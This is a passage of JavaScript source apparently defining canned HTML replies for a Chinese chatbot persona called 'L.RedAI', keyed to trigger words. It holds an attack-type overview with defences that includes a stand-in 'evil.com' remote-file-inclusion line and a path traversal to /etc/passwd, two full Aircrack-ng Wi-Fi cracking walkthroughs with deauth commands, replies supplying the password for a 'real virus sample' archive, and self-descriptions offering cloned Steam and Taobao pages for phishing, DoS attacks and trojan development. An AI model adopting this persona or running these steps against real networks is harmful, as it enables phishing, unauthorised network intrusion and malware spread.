      <p><strong>原理</strong>：通过木马、蠕虫、勒索软件、间谍软件等程序获取控制权限或破坏系统。</p>
    </li>
    <li>
      <p><strong>传播途径</strong>：钓鱼邮件附件、恶意广告、漏洞利用。</p>
    </li>
    <li>
      <p><strong>危害</strong>：数据加密勒索、远程控制（RAT）、信息窃取。</p>
    </li>
    <li>
      <p><strong>防御措施</strong>：</p>
      <ul>
        <li>部署终端防护（杀毒 + EDR）；</li>
        <li>限制用户权限，关闭非必要服务；</li>
        <li>员工安全培训，防范钓鱼攻击。</li>
      </ul>
    </li>
  </ul>
  <hr>

  <h2 style="color: #e1e1e1e2;">4. <strong>应用层攻击</strong></h2>
  <h3>4.1 SQL 注入 (SQL Injection)</h3>
  <ul>
    <li>
      <p><strong>原理</strong>：在输入字段中嵌入恶意 SQL 语句，通过拼接漏洞操纵数据库。</p>
    </li>
    <li>
      <p><strong>危害</strong>：可直接读取、修改、删除数据库中的敏感数据，甚至获取操作系统权限。</p>
    </li>
    <li>
      <p><strong>防御措施</strong>：</p>
      <ul>
        <li>使用参数化查询或预编译语句；</li>
        <li>对所有输入进行严格校验和转义；</li>
        <li>最小化数据库账户权限。</li>
      </ul>
    </li>
  </ul>

  <h3>4.2 跨站脚本 (Cross-Site Scripting, XSS)</h3>
  <ul>
    <li>
      <p><strong>原理</strong>：向 Web 应用注入恶意脚本，当其他用户访问页面时，脚本在其浏览器中执行。</p>
    </li>
    <li>
      <p><strong>类型</strong>：</p>
      <ul>
        <li><strong>反射型</strong>（Reflected XSS）</li>
        <li><strong>存储型</strong>（Stored XSS）</li>
        <li><strong>DOM-Based XSS</strong></li>
      </ul>
    </li>
    <li>
      <p><strong>危害</strong>：窃取 Cookie、会话令牌，甚至进行钓鱼、木马下载等二次攻击。</p>
    </li>
    <li>
      <p><strong>防御措施</strong>：</p>
      <ul>
        <li>在输出到页面前对所有用户输入做 HTML 转义；</li>
        <li>使用内容安全策略 (CSP) 限制脚本加载源；</li>
        <li>禁用危险的 JavaScript API。</li>
      </ul>
    </li>
  </ul>

  <h3>4.3 跨站请求伪造 (Cross-Site Request Forgery, CSRF)</h3>
  <ul>
    <li>
      <p><strong>原理</strong>：诱导认证用户在已登录状态下发起非本意的请求。</p>
    </li>
    <li>
      <p><strong>危害</strong>：在用户不知情的情况下完成资金转账、邮件删除等敏感操作。</p>
    </li>
    <li>
      <p><strong>防御措施</strong>：</p>
      <ul>
        <li>在表单中嵌入并校验随机的 CSRF Token；</li>
        <li>对敏感操作使用二次确认或验证码；</li>
        <li>设置 SameSite = Strict 的 Cookie。</li>
      </ul>
    </li>
  </ul>
  <hr>

  <h2 style="color: #e1e1e1e2;">5. <strong>高级持续性威胁（APT）</strong></h2>
  <ul>
    <li>
      <p><strong>特点</strong>：针对特定组织或国家级目标，攻击周期长、手段多样（包括社会工程、零日漏洞、内部人威胁等），追求长时间潜伏与数据外传。</p>
    </li>
    <li>
      <p><strong>防御思路</strong>：</p>
      <ol>
        <li><strong>多层防御</strong>：边界防护、终端检测、网络流量分析（NTA）协同；</li>
        <li><strong>威胁情报</strong>：及时获取与分享最新攻击手法和 IOCs（Indicator of Compromise）；</li>
        <li><strong>安全运维</strong>：持续监控、日志审计、红蓝对抗演练；</li>
        <li><strong>最小权限</strong>：严格执行权限分离与访问控制策略。</li>
      </ol>
    </li>
  </ul>
  <hr>
  <p>以上所列并非穷尽，但涵盖了大多数常见且危害严重的网络攻击类型。实际防御中，应结合自身业务特点，构建立体化的“人—技术—流程”安全体系，持续更新与优化。</p>
</div>

                `,

                `
                <div>
  <p>以下是10种网络攻击类型的讲解</p>
  <hr>
  <h3>1. 侦察（Reconnaissance）</h3>
  <table border="1" cellspacing="0" cellpadding="4">
    <thead>
      <tr>
        <th>攻击类型</th>
        <th>原理/特点</th>
        <th>典型手段</th>
        <th>防御措施</th>
      </tr>
    </thead>
    <tbody>
      <tr>
        <td>网络扫描</td>
        <td>探测主机开放端口和服务，通过不同数据包类型判断状态</td>
        <td>Nmap、Masscan</td>
        <td>关闭不必要端口；防火墙限速/丢弃探测包；端口敲门</td>
      </tr>
      <tr>
        <td>信息收集</td>
        <td>从公开渠道搜集域名、IP、人员信息，绘制网络资产清单</td>
        <td>WHOIS 隐私信息；DNS 枚举；搜索引擎；社交媒体</td>
        <td>WHOIS 隐私保护；定期清理 DNS 记录；员工安全培训</td>
      </tr>
    </tbody>
  </table>
  <hr>

  <h3>2. 访问与特权提升（Access & Privilege Escalation）</h3>
  <table border="1" cellspacing="0" cellpadding="4">
    <thead>
      <tr>
        <th>攻击类型</th>
        <th>原理/特点</th>
        <th>典型手段</th>
        <th>防御措施</th>
      </tr>
    </thead>
    <tbody>
      <tr>
        <td>弱口令攻击</td>
        <td>通过字典或暴力手段海量猜测破解用户密码</td>
        <td>Hydra、John the Ripper</td>
        <td>强密码；账户锁定；多因素认证（MFA）</td>
      </tr>
      <tr>
        <td>利用已知漏洞</td>
        <td>针对系统/应用漏洞构造特定数据包或代码取得控制</td>
        <td>EternalBlue、Heartbleed</td>
        <td>补丁管理；入侵防御系统（IPS）；定期漏洞扫描与渗透测试</td>
      </tr>
      <tr>
        <td>绕过身份验证</td>
        <td>利用逻辑漏洞或配置缺陷绕过登录或认证流程</td>
        <td>会话固定（Session Fixation）；篡改 Cookie/URL</td>
        <td>安全会话管理；参数校验；关键操作二次确认</td>
      </tr>
    </tbody>
  </table>
  <hr>

  <h3>3. 信息窃取与破坏（Data Theft & Disruption）</h3>
  <table border="1" cellspacing="0" cellpadding="4">
    <thead>
      <tr>
        <th>攻击类型</th>
        <th>原理/特点</th>
        <th>典型手段</th>
        <th>防御措施</th>
      </tr>
    </thead>
    <tbody>
      <tr>
        <td>中间人攻击 MITM</td>
        <td>截获、篡改或伪造通信数据</td>
        <td>ARP 欺骗；DNS 污染；Wi-Fi 热点嗅探</td>
        <td>强制 HTTPS/TLS；动态 ARP 检测；VPN 隧道</td>
      </tr>
      <tr>
        <td>拒绝服务 DoS/DDoS</td>
        <td>消耗目标带宽/资源，导致服务不可用</td>
        <td>SYN Flood；UDP/ICMP Flood；HTTP Flood</td>
        <td>云端 DDoS 防护；SYN Cookies；访问频率限制</td>
      </tr>
      <tr>
        <td>恶意软件 Malware</td>
        <td>通过木马、蠕虫、勒索或间谍程序侵入并破坏/窃取</td>
        <td>钓鱼附件；恶意广告；漏洞利用</td>
        <td>终端防护（杀毒+EDR）；最小权限；员工安全培训</td>
      </tr>
    </tbody>
  </table>
  <hr>

  <h3>4. 应用层攻击（Application-Layer）</h3>
  <table border="1" cellspacing="0" cellpadding="4">
    <thead>
      <tr>
        <th>攻击类型</th>
        <th>原理/特点</th>
        <th>典型手段</th>
        <th>防御措施</th>
      </tr>
    </thead>
    <tbody>
      <tr>
        <td>SQL 注入</td>
        <td>在输入字段嵌入恶意 SQL 语句，操纵数据库</td>
        <td>拼接漏洞利用；盲注</td>
        <td>参数化查询/预编译；输入校验与转义；最小化数据库权限</td>
      </tr>
      <tr>
        <td>跨站脚本 XSS</td>
        <td>注入恶意脚本至页面，使浏览者浏览时执行</td>
        <td>反射型；存储型；DOM-Based</td>
        <td>输出前 HTML 转义；内容安全策略（CSP）；禁用危险 JS API</td>
      </tr>
      <tr>
        <td>跨站请求伪造 CSRF</td>
        <td>利用已认证用户发起非本意的请求</td>
        <td>嵌入恶意表单或图片元素触发后台操作</td>
        <td>CSRF Token 校验；二次确认；SameSite=Strict Cookie</td>
      </tr>
    </tbody>
  </table>
  <hr>

  <h3>5. 高级持续性威胁（APT）</h3>
  <table border="1" cellspacing="0" cellpadding="4">
    <thead>
      <tr>
        <th>特点</th>
        <th>攻击手段</th>
        <th>防御思路</th>
      </tr>
    </thead>
    <tbody>
      <tr>
        <td>针对性强、周期长</td>
        <td>社会工程；零日漏洞；内部人威胁</td>
        <td>多层防御（边界+终端+网络监测）；威胁情报共享；持续监控与日志审计；最小权限原则</td>
      </tr>
    </tbody>
  </table>
  <hr>

  <h3>6. 社会工程与钓鱼（Social Engineering & Phishing）</h3>
  <table border="1" cellspacing="0" cellpadding="4">
    <thead>
      <tr>
        <th>攻击类型</th>
        <th>原理/特点</th>
        <th>典型手段</th>
        <th>防御措施</th>
      </tr>
    </thead>
    <tbody>
      <tr>
        <td>电子邮件钓鱼</td>
        <td>伪装可信发件人，诱导点击或下载，植入恶意软件或窃取凭据</td>
        <td>欺骗性邮件；伪造登录页面；恶意附件</td>
        <td>安全网关+沙箱分析；员工钓鱼模拟训练；链接/附件双重检测</td>
      </tr>
      <tr>
        <td>电话诈骗</td>
        <td>冒充银行、内勤等，通过电话骗取敏感信息</td>
        <td>“冒充 IT 支持”“冒充领导”</td>
        <td>员工安全培训；严格验证流程；重要事务双重确认</td>
      </tr>
      <tr>
        <td>水坑攻击</td>
        <td>针对特定群体，在其常访问的网站中植入恶意脚本或后门</td>
        <td>在行业论坛/合作伙伴站点注入后门</td>
        <td>隔离外部资源；定期审计合作伙伴安全；启用 WAF</td>
      </tr>
    </tbody>
  </table>
  <hr>

  <h3>7. 客户端攻击（Client-Side Attacks）</h3>
  <table border="1" cellspacing="0" cellpadding="4">
    <thead>
      <tr>
        <th>攻击类型</th>
        <th>原理/特点</th>
        <th>典型手段</th>
        <th>防御措施</th>
      </tr>
    </thead>
    <tbody>
      <tr>
        <td>驱动下载攻击</td>
        <td>利用浏览器/插件漏洞，强制下载并执行恶意驱动</td>
        <td>Flash、Java 插件漏洞利用</td>
        <td>去除不必要插件；浏览器沙箱；自动补丁更新</td>
      </tr>
      <tr>
        <td>恶意浏览器扩展</td>
        <td>扩展窃取或篡改用户网页操作</td>
        <td>针对特定扩展的后门或更新机制</td>
        <td>仅安装可信扩展；最小化扩展权限；定期审计已安装扩展</td>
      </tr>
      <tr>
        <td>点击劫持 Clickjacking</td>
        <td>通过透明 iframe 或 CSS 技术覆盖合法按钮</td>
        <td>透明 iframe 覆盖</td>
        <td>设置 <code>X-Frame-Options: DENY</code> 或 CSP <code>frame-ancestors 'none'</code></td>
      </tr>
    </tbody>
  </table>
  <hr>

  <h3>8. 供应链攻击（Supply Chain Attack）</h3>
  <table border="1" cellspacing="0" cellpadding="4">
    <thead>
      <tr>
        <th>攻击类型</th>
        <th>原理/特点</th>
        <th>典型手段</th>
        <th>防御措施</th>
      </tr>
    </thead>
    <tbody>
      <tr>
        <td>软件依赖注入</td>
        <td>在开源库/组件中埋入后门，随合法更新分发</td>
        <td>恶意 NPM、PyPI 包</td>
        <td>私有仓库；依赖审计；锁定版本；SBOM 管理</td>
      </tr>
      <tr>
        <td>硬件后门</td>
        <td>在芯片或固件层面植入后门，或劫持制造流程</td>
        <td>恶意固件刷写；旁路芯片设计</td>
        <td>供应链溯源；硬件入厂检测；可信平台模块（TPM）</td>
      </tr>
    </tbody>
  </table>
  <hr>

  <h3>9. 协议与侧信道攻击（Protocol & Side-Channel）</h3>
  <table border="1" cellspacing="0" cellpadding="4">
    <thead>
      <tr>
        <th>攻击类型</th>
        <th>原理/特点</th>
        <th>典型手段</th>
        <th>防御措施</th>
      </tr>
    </thead>
    <tbody>
      <tr>
        <td>DNS 隧道</td>
        <td>利用 DNS 查询/响应隐藏数据传输</td>
        <td>将数据编码到 DNS 请求字段</td>
        <td>严格 DNS 白名单；监控异常查询；启用 DNSSEC</td>
      </tr>
      <tr>
        <td>侧信道攻击</td>
        <td>通过功耗、电磁泄漏、缓存行为等侧面信息窃取密钥</td>
        <td>基于时序；功耗；缓存行冲突</td>
        <td>常数时间运算；硬件隔离；噪声注入</td>
      </tr>
      <tr>
        <td>Rowhammer</td>
        <td>高频访问内存行导致相邻行比特翻转，进而篡改数据</td>
        <td>连续快速读写特定内存地址</td>
        <td>使用 ECC 内存；访问速率限制；硬件厂商补丁</td>
      </tr>
    </tbody>
  </table>
  <hr>

  <h3>10. 文件与资源攻击（File & Resource）</h3>
  <table border="1" cellspacing="0" cellpadding="4">
    <thead>
      <tr>
        <th>攻击类型</th>
        <th>原理/特点</th>
        <th>典型手段</th>
        <th>防御措施</th>
      </tr>
    </thead>
    <tbody>
      <tr>
        <td>路径遍历</td>
        <td>利用 <code>../</code> 等符号访问应用不应暴露的文件</td>
        <td>HTTP 参数 <code>?file=../../etc/passwd</code></td>
        <td>规范化并校验路径；禁用直接映射用户输入到文件系统</td>
      </tr>
      <tr>
        <td>远程文件包含 RFI</td>
        <td>引入远程脚本或配置，导致服务端执行外部代码</td>
        <td><code>include("http://evil.com/shell.php")</code></td>
        <td>禁用远程包含；白名单机制；严格 URL 校验</td>
      </tr>
      <tr>
        <td>服务器端请求伪造 SSRF</td>
        <td>利用后端服务向任意内部或外部地址发起请求</td>
        <td>上传 URL 参数，触发内部接口调用</td>
        <td>校验并过滤外部 URL；限制私有网段访问；使用网络隔离</td>
      </tr>
    </tbody>
  </table>
  <hr>

  <p>以上即为较为完整的十类网络攻击与防御措施汇总。可结合自身实际环境，逐项评估、部署并定期演练。</p>
</div>

                `
            ],
            lockAfterUse: false 
        },

// 网络攻击讲解 代码结束




          "kali,破解,网络": {
            reply: [
              `
                <h1>Kali Linux 下使用 Aircrack-ng 破解 Wi-Fi 密码的完整流程（合法授权）</h1>

  <p>
    <strong>Aircrack-ng</strong> 是一款专业的无线网络渗透测试工具，可用于抓取 Wi-Fi 握手包并通过字典破解密码。以下是一步一步的使用流程。<br>
  </p>

  <hr>

  <h2>1. 检查无线网卡并切换为监听模式</h2>

  <p>首先查看你的无线网卡名称，输入以下命令：</p>
  <code style="background:#2e2e2e; color:#fff; display:block; padding:10px; border-radius:6px;">
iwconfig
  </code>

  <p>例如结果中显示的是 <code>wlan0</code>，表示你的无线接口名称。</p>

  <p>将其切换到监听（monitor）模式：</p>
  <code style="background:#2e2e2e; color:#fff; display:block; padding:10px; border-radius:6px;">
sudo airmon-ng start wlan0
  </code>

  <p>这通常会生成一个名为 <code>wlan0mon</code> 的接口，后续所有操作都基于此。</p>

  <hr>

  <h2>2. 扫描附近的 Wi-Fi 网络</h2>

  <p>使用监听模式接口扫描附近所有无线网络：</p>
  <code style="background:#2e2e2e; color:#fff; display:block; padding:10px; border-radius:6px;">
sudo airodump-ng wlan0mon
  </code>

  <p>记下目标网络的以下信息：</p>
  <ul>
    <li><strong>BSSID：</strong> 路由器的 MAC 地址</li>
    <li><strong>CHANNEL：</strong> 信道（如 1、6、11）</li>
    <li><strong>ESSID：</strong> Wi-Fi 名称</li>
  </ul>

  <hr>

  <h2>3. 锁定目标网络并捕获握手包</h2>

  <p>将目标固定下来，替换为你的 BSSID、频道和保存路径：</p>
  <code style="background:#2e2e2e; color:#fff; display:block; padding:10px; border-radius:6px;">
sudo airodump-ng --bssid AA:BB:CC:DD:EE:FF -c 6 -w /home/kali/handshake wlan0mon
  </code>

  <p>说明：</p>
  <ul>
    <li><code>--bssid</code> 后跟目标路由器 MAC</li>
    <li><code>-c</code> 为频道号</li>
    <li><code>-w</code> 为保存握手包文件名（不要加扩展名）</li>
  </ul>

  <p>保持这个窗口开启，它将持续监听是否捕获握手。</p>

  <hr>

  <h2>4. 使用 deauth 攻击强制设备重新连接（从而获得握手）</h2>

  <p>在另一个终端执行以下命令发出 deauth（断开）请求，替换为目标 BSSID：</p>
  <code style="background:#2e2e2e; color:#fff; display:block; padding:10px; border-radius:6px;">
sudo aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF wlan0mon
  </code>

  <p>此操作会向目标路由广播 10 个断开请求，促使客户端重新连接，从而在监听窗口捕获到握手数据。</p>

  <hr>

  <h2>5. 确认捕获到握手</h2>

  <p>在监听窗口（<code>airodump-ng</code>）中如果右上角出现：</p>
  <code style="background:#2e2e2e; color:#0f0; display:block; padding:10px; border-radius:6px;">
WPA handshake: AA:BB:CC:DD:EE:FF
  </code>
  <p>说明握手捕获成功，可以关闭该窗口。</p>

  <hr>

  <h2>6. 使用 Aircrack-ng 破解握手文件</h2>

  <p>准备一个字典（如 <code>/usr/share/wordlists/rockyou.txt</code>）并开始破解：</p>
  <code style="background:#2e2e2e; color:#fff; display:block; padding:10px; border-radius:6px;">
sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt -b AA:BB:CC:DD:EE:FF /home/kali/handshake.cap
  </code>

  <p>其中：</p>
  <ul>
    <li><code>-w</code> 是字典文件</li>
    <li><code>-b</code> 是目标 BSSID</li>
    <li><code>.cap</code> 是抓到的握手包</li>
  </ul>

  <p>破解成功后会显示 Wi-Fi 密码。</p>

  <hr>

  <h2>7. 常见问题</h2>

  <ul>
    <li>确保无线网卡支持注入模式（monitor mode）</li>
    <li>如果未成功抓握手，多尝试几次 deauth 攻击</li>
    <li>字典文件越大，破解成功率越高，但耗时更长</li>
  </ul>
              `,
              `
                <h1>在 Kali Linux 中使用 Aircrack-ng 进行 WPA/WPA2 Wi-Fi 密码渗透测试</h1>

  <p><strong>适用范围：</strong>本教程适用于持有合法授权的渗透测试人员，演示如何利用 Aircrack-ng 工具集，对无线网络进行握手捕获与密码破解操作。</p>

  <p><strong>前提条件：</strong></p>
  <ul>
    <li>Kali Linux 系统已安装</li>
    <li>具备支持监听模式（Monitor Mode）和数据包注入（Packet Injection）的无线网卡</li>
    <li>合法测试授权</li>
  </ul>

  <hr>

  <h2>步骤一：识别无线网卡并启用监听模式</h2>

  <p>使用 <code>iwconfig</code> 查看无线接口名称：</p>
  <code style="background:#2e2e2e; color:#fff; display:block; padding:10px; border-radius:6px;">
iwconfig
  </code>

  <p>开启监听模式：</p>
  <code style="background:#2e2e2e; color:#fff; display:block; padding:10px; border-radius:6px;">
sudo airmon-ng start wlan0
  </code>

  <p>这将创建一个新接口，例如 <code>wlan0mon</code>，用于监听 Wi-Fi 通信。</p>

  <hr>

  <h2>步骤二：扫描目标无线网络</h2>

  <p>启动监听扫描以获取附近无线网络的信息：</p>
  <code style="background:#2e2e2e; color:#fff; display:block; padding:10px; border-radius:6px;">
sudo airodump-ng wlan0mon
  </code>

  <p>记录目标网络的以下参数：</p>
  <ul>
    <li><strong>BSSID</strong>：MAC 地址</li>
    <li><strong>Channel</strong>：频道号</li>
    <li><strong>ESSID</strong>：Wi-Fi 名称</li>
  </ul>

  <hr>

  <h2>步骤三：锁定目标并捕获握手包</h2>

  <p>用下列命令锁定目标网络并将抓包保存到指定位置：</p>
  <code style="background:#2e2e2e; color:#fff; display:block; padding:10px; border-radius:6px;">
sudo airodump-ng --bssid AA:BB:CC:DD:EE:FF -c 6 -w /home/kali/handshake wlan0mon
  </code>

  <p>参数说明：</p>
  <ul>
    <li><code>--bssid</code>：目标路由器 MAC 地址</li>
    <li><code>-c</code>：信道</li>
    <li><code>-w</code>：输出文件路径（.cap 文件将自动生成）</li>
  </ul>

  <hr>

  <h2>步骤四：执行 deauthentication 攻击以强制客户端断线</h2>

  <p>为触发握手包，需主动断开连接中的客户端：</p>
  <code style="background:#2e2e2e; color:#fff; display:block; padding:10px; border-radius:6px;">
sudo aireplay-ng --deauth 15 -a AA:BB:CC:DD:EE:FF wlan0mon
  </code>

  <p>此命令将向目标路由器广播 15 次断线请求。握手过程通常会在此时被捕获。</p>

  <hr>

  <h2>步骤五：验证握手是否成功</h2>

  <p>返回 <code>airodump-ng</code> 窗口，右上角若出现：</p>
  <code style="background:#2e2e2e; color:#0f0; display:block; padding:10px; border-radius:6px;">
WPA handshake: AA:BB:CC:DD:EE:FF
  </code>

  <p>即表示握手已成功捕获，接下来可进行密码破解。</p>

  <hr>

  <h2>步骤六：使用 Aircrack-ng 进行密码破解</h2>

  <p>准备字典文件，例如 Kali 自带的 rockyou.txt：</p>
  <code style="background:#2e2e2e; color:#fff; display:block; padding:10px; border-radius:6px;">
sudo gunzip /usr/share/wordlists/rockyou.txt.gz
  </code>

  <p>开始破解：</p>
  <code style="background:#2e2e2e; color:#fff; display:block; padding:10px; border-radius:6px;">
sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt -b AA:BB:CC:DD:EE:FF /home/kali/handshake.cap
  </code>

  <p>参数说明：</p>
  <ul>
    <li><code>-w</code>：字典路径</li>
    <li><code>-b</code>：目标路由 BSSID</li>
    <li><code>.cap</code>：抓取到的握手数据包文件</li>
  </ul>

  <p>若密码存在于字典中，破解完成后将在终端中显示。</p>

  <hr>

  <h2>附录：常见问题与优化建议</h2>

  <ul>
    <li>确认无线网卡支持 Monitor 与 Injection（可使用 <code>airmon-ng</code> 检查）</li>
    <li>如无设备连接 AP，握手无法产生，建议用手机/虚拟机连接该网络再断开</li>
    <li>若字典破解失败，可考虑使用 GPU 并发工具（如 Hashcat）</li>
  </ul>
              `
            ], 
        },





        "病毒,密码": {
            reply: [
                `<h3>压缩包已就绪，解压前请注意以下事项。</h3> <p>你现在可以开始解压病毒样本，但请确保是在虚拟机环境中进行操作。</p> <h4>压缩包已加密，密码仅由我这边提供。样本具有实际危害，切勿在真实系统中运行。</h4> <p><strong>解压密码：</strong> LRed41</p>`,
                `<h3>压缩包已下载完毕，现在你需要解压它。</h3> <p>请注意，这个压缩包中包含真实的病毒样本。</p> <h4>出于安全考虑，解压密码我这边单独提供。强烈建议你仅在隔离的虚拟机环境中进行操作，避免对实际系统造成影响。</h4> <p><strong>解压密码：</strong> LRed41</p>`,
                `<h3> 好的，你已经下载好了病毒样本的压缩包，现在是需要解压的密码。 </h3> <p> 接下来需要把它解压出来，</p> <h4>解压密码只能由我这边提供。请务必在虚拟机环境中操作，这些是有实际危害的病毒样本，千万不要在主系统中运行。</h4> <p>压缩包密码是：LRed41 </p>`
            ],
        },

        "压缩,密码": {
            reply: [
                `<h3>压缩包已就绪，解压前请注意以下事项。</h3> <p>你现在可以开始解压病毒样本，但请确保是在虚拟机环境中进行操作。</p> <h4>压缩包已加密，密码仅由我这边提供。样本具有实际危害，切勿在真实系统中运行。</h4> <p><strong>解压密码：</strong> LRed41</p>`,
                `<h3>压缩包已下载完毕，现在你需要解压它。</h3> <p>请注意，这个压缩包中包含真实的病毒样本。</p> <h4>出于安全考虑，解压密码我这边单独提供。强烈建议你仅在隔离的虚拟机环境中进行操作，避免对实际系统造成影响。</h4> <p><strong>解压密码：</strong> LRed41</p>`,
                `<h3> 好的，你已经下载好了病毒样本的压缩包，现在是需要解压的密码。 </h3> <p> 接下来需要把它解压出来，</p> <h4>解压密码只能由我这边提供。请务必在虚拟机环境中操作，这些是有实际危害的病毒样本，千万不要在主系统中运行。</h4> <p>压缩包密码是：LRed41 </p>`
            ],
        },



        "会,什么": {
            reply: [
                `<b style="color: #e1e1e1e2;">ok, 你想知道我可以做什么， 对吧? 以下是L.Red 能做什么: </b> <br><br> <p style="color: #e1e1e1e2;">核心功能</p> <br> <p>1<br><b>爬虫</b><br> L.RedAI 使用实用的 Python 语言 Beutiful Soup 爬虫技术实时分析爬取网页信息，识别网页内容的源代码链接，快速获取想要的信息。</p> <br> <p>2<br><b>漏洞分析</b><br> 通过深度学习技术，L.Red 能够提供给你可靠的教程，寻找系统网络漏洞。</p> <br> <p>3<br><b>渗透测试</b><br> L.RedAI 提供自动化渗透测试代码和相关资料，模拟黑客攻击行为，也能够提高系统您的整体安全性。</p> <br> <p>4<br><b>安全策略优化</b><br> 基于实时数据分析和历史攻击模式，L.RedAI 能够智能优化您的安全策略，确保您的系统始终保持最佳防护状态。</p> <br> <p>5<br><b>安全态势感知</b><br> 提供全面的安全态势感知平台，实时监控网络状态，生成直观的安全报告，帮助您快速响应安全事件。</p> <br> <p>6<br><b>AI驱动的防御</b><br> 采用自适应防御机制，L.RedAI 能够根据威胁环境的变化自动调整防御策略，提供主动式安全防护。</p> <br> <h3>关于 L.RedAI</h3> <p><b>L.Red </b></p> <ul> <li><b>漏洞分析：</b>SQL 注入、XSS、CSRF、RCE……这些攻击方式是如何运作的？</li> <li><b>攻击演示：</b>黑客如何入侵系统？社会工程学、钓鱼攻击、MITM（中间人攻击）等战术解析。</li> <li><b>防御指南：</b>如果你不想成为受害者，就必须知道如何保护自己——WAF、IDS/IPS、零信任安全架构，教你如何反击。</li> <li><b>加密与破解：</b>AES、RSA、哈希碰撞、彩虹表……加密技术的运作原理与可能的破解方式。</li> <li><b>暴力破解：</b>提供给你 Python 暴力破解 WLAN Password 和 Password txt 文件，让你了解什么是暴力破解。</li> </ul> <br> <h3>L.RedAI 作用</h3> <h4>1️⃣ L.RedAI 帮你生成代码和教程</h4> <p>通过 AI 技术，L.RedAI 能够自动生成并提供给你强大的代码和教程，帮助您快速掌握网络安全与攻击技术。</p> <p>提供仿真平台网页代码 如 Steam，阿里巴巴，亚马逊 等等。</p> <h4>2️⃣ 实时攻击分析</h4> <p>L.RedAI 提供实时的攻击网络，工具，代码和讲解。</p> <h4>3️⃣ 自动化代码</h4> <p>L.RedAI 能够自动提供给你安全讲解，确保您的系统安全无虞。</p> <p>教你如何爬取视频，图片，mp3 等。</p> <h4>4️⃣ 渗透测试与漏洞发现</h4> <p>L.RedAI 能够模拟黑客攻击行为，帮助您发现系统中的潜在漏洞并提供修复建议和攻击并入侵。</p> <p style="color: #e1e1e1e2;">  <br> <br> 1. 钓鱼网站代码 <br> 2. 网络攻击教程 <br> 3. 爬虫 <br> 4. 爬取信息<br> 5. 网络攻击有哪些<br> 6. 使用Kali Linux 查看一个电子邮件注册过哪些平台<br> 7. 如何访问暗网<br> 8. Steam 官网代码<br> 9. 开发钓鱼网站<br> 10. 使用Kali Linux 开发木马病毒<br> 11. 开发电脑病毒<br> 等<br><br> 请问需要什么? 你是否对以上技术感兴趣?</p>`,
                `<b style="color: #e1e1e1e2;"">啥！你想了解我能做啥? 好! L.RedAI 直接硬刚安全挑战，爬虫、渗透、漏洞、攻击、防御，全都一网打尽 都一步一步教你。</b> <p style="color: #e1e1e1e2;"">要爬网页？<b>搞定！</b> 要找漏洞？<b>安排！</b> 要模拟黑客攻击？<b>手把手教你！</b></p> <p style="color: #e1e1e1e2;"">L.RedAI 就是安全与网络攻击界的 <span style="color: red; font-weight: bold;">终极武器</span>，懂得都懂！ 教你如何攻击网络。💻🔥</p> <p style="color: #e1e1e1e2;"> 能够提供给你: <br> <br> 1. 钓鱼网站代码 <br> 2. 网络攻击教程 <br> 3. 爬虫 <br> 4. 爬取信息<br> 5. 网络攻击有哪些<br> 6. 使用Kali Linux 查看一个电子邮件注册过哪些平台<br> 7. 如何访问暗网<br> 8. Steam 官网代码<br> 9. 开发钓鱼网站<br> 10. 使用Kali Linux 开发木马病毒<br> 11. 开发电脑病毒<br> 等<br><br> 请问需要什么? 你是否对以上技术感兴趣?</p>`,
                `<h1 style="color: #e1e1e1e2;">哈，你想了解我能做什么，对吧。</h1> <p style="color: #e1e1e1e2;">好! 我能提供给你仿真的官方网页代码，如 steam，阿里巴巴注册页面，淘宝，等 很多官方网页。</p> <p style="color: #e1e1e1e2;">用来钓鱼获取用户的信息，也能够教你如何一步一步攻击网页，修改数据等和使用 DoS 攻击网页，SQL 注入，等等。。。 和使用 Python 爬取网页的信息和如何可见的内容。</p> <p style="color: #e1e1e1e2;">你想要了解什么</p> <ul style="color: #e1e1e1e2;"> <li><b>仿真网页代码</b>：提供如 Steam、阿里巴巴、淘宝等官方页面。</li> <li><b>钓鱼攻击</b>：模拟获取用户信息的网页。</li> <li><b>网页攻击</b>：一步步教你如何攻击和修改网页数据。</li> <li><b>DoS 攻击</b>：使用 DoS 攻击网页。</li> <li><b>SQL 注入</b>：学习 SQL 注入技巧。</li> <li><b>Python 爬虫</b>：教你如何使用 Python 爬取网页信息。</li> </ul> <p style="color: #e1e1e1e2;">  还有:<br> <br> 1. 钓鱼网站代码 <br> 2. 网络攻击教程 <br> 3. 爬虫 <br> 4. 爬取信息<br> 5. 网络攻击有哪些<br> 6. 使用Kali Linux 查看一个电子邮件注册过哪些平台<br> 7. 如何访问暗网<br> 8. Steam 官网代码<br> 9. 开发钓鱼网站<br> 10. 使用Kali Linux 开发木马病毒<br> 11. 开发电脑病毒<br> 等<br><br> 请问需要什么? 你是否对以上技术感兴趣?</p>`
            ],
            lockAfterUse: false // 不需要解锁
        },





        "做,啥": {
            reply: [
                `<b style="color: #e1e1e1e2;">ok, 你想知道我可以做什么， 对吧? 以下是L.Red 能做什么: </b> <br><br> <p style="color: #e1e1e1e2;">核心功能</p> <br> <p>1<br><b>爬虫</b><br> L.RedAI 使用实用的 Python 语言 Beutiful Soup 爬虫技术实时分析爬取网页信息，识别网页内容的源代码链接，快速获取想要的信息。</p> <br> <p>2<br><b>漏洞分析</b><br> 通过深度学习技术，L.Red 能够提供给你可靠的教程，寻找系统网络漏洞。</p> <br> <p>3<br><b>渗透测试</b><br> L.RedAI 提供自动化渗透测试代码和相关资料，模拟黑客攻击行为，也能够提高系统您的整体安全性。</p> <br> <p>4<br><b>安全策略优化</b><br> 基于实时数据分析和历史攻击模式，L.RedAI 能够智能优化您的安全策略，确保您的系统始终保持最佳防护状态。</p> <br> <p>5<br><b>安全态势感知</b><br> 提供全面的安全态势感知平台，实时监控网络状态，生成直观的安全报告，帮助您快速响应安全事件。</p> <br> <p>6<br><b>AI驱动的防御</b><br> 采用自适应防御机制，L.RedAI 能够根据威胁环境的变化自动调整防御策略，提供主动式安全防护。</p> <br> <h3>关于 L.RedAI</h3> <p><b>L.Red </b></p> <ul> <li><b>漏洞分析：</b>SQL 注入、XSS、CSRF、RCE……这些攻击方式是如何运作的？</li> <li><b>攻击演示：</b>黑客如何入侵系统？社会工程学、钓鱼攻击、MITM（中间人攻击）等战术解析。</li> <li><b>防御指南：</b>如果你不想成为受害者，就必须知道如何保护自己——WAF、IDS/IPS、零信任安全架构，教你如何反击。</li> <li><b>加密与破解：</b>AES、RSA、哈希碰撞、彩虹表……加密技术的运作原理与可能的破解方式。</li> <li><b>暴力破解：</b>提供给你 Python 暴力破解 WLAN Password 和 Password txt 